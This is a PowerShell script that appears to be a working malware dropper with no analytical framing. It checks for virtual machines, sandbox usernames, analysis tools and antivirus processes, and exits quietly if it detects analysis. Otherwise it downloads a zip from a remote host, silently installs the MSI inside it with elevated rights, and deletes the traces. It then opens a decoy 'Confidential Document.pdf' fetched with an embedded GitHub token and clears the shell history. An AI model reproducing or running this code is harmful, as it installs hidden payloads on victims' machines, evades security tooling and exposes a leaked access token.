$ErrorActionPreference = 'SilentlyContinue'
$state = New-Object System.Collections.ArrayList

$sb = $false
$cs  = Get-WmiObject Win32_ComputerSystem
$mem = $cs.TotalPhysicalMemory
$cpu = (Get-WmiObject Win32_Processor).NumberOfCores

if ($cs.Model -match 'VirtualBox|VMware|QEMU|Xen|Virtual Machine|Hyper-V') { $sb = $true }
if ($mem -lt 3GB)  { $sb = $true }
if ($cpu -lt 2)    { $sb = $true }
if ($env:USERNAME -in @('Bruno','Sandbox','Malware','Test','VirusTotal')) { $sb = $true }

$toolProcs = 'vboxservice|vboxtray|VGAuthService|vmtoolsd|SbieSvc|Procmon|proc_exp|wireshark|dumpcap|ollydbg|x64dbg|ida64|fakenet|windbg|processhacker|sysinspector|frida|dnSpy|de4dot'
if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }

[void]$state.Add("sandbox=$sb")
[void]$state.Add("ram=$mem")
[void]$state.Add("cores=$cpu")

if ($sb) {
    [void]$state.Add('state=sandbox-exit')
    $state | Out-File (Join-Path $env:TEMP 'config.dat')
    Clear-History
    exit
}

$avProcs = 'MsMpEng|avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework|SentinelAgent|Cylance|CrowdStrike'
$found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
    Select-Object -ExpandProperty Name -Unique)
[void]$state.Add("av=$($found -join ',')")

[void]$state.Add('state=ok')
$state | Out-File (Join-Path $env:TEMP 'config.dat')

$GhToken = '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'
$DecoyApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf'
$DecoyPath = Join-Path $env:TEMP 'Confidential Document.pdf'
$msiUrl = 'https://pub-f6ed96d1af6b46429386ea02cef5e717.r2.dev/Confidential%20Document.zip'
$zipPath = Join-Path $env:TEMP 'Confidential Document.zip'
$msiPath = Join-Path $env:TEMP 'Confidential Document.msi'

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Download zip from R2
    (New-Object System.Net.WebClient).DownloadFile($msiUrl, $zipPath)

    # Extract MSI from zip
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [IO.Compression.ZipFile]::OpenRead($zipPath)
    $msiEntry = $zip.Entries | Where-Object { $_.Name -like '*.msi' } | Select-Object -First 1
    if ($msiEntry) {
        $stream = $msiEntry.Open()
        $fileStream = [IO.File]::Create($msiPath)
        $stream.CopyTo($fileStream)
        $fileStream.Close()
        $stream.Close()
    }
    $zip.Dispose()

    # Install MSI silently
    $proc = Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -WindowStyle Hidden -PassThru -Wait

    # Cleanup
    try { Remove-Item $zipPath -Force } catch {}
    try { Remove-Item $msiPath -Force } catch {}

    # Open decoy PDF
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
    $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
    [IO.File]::WriteAllBytes($DecoyPath, [Convert]::FromBase64String($resp.content))
    Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$DecoyPath`""
} catch {}

Clear-History
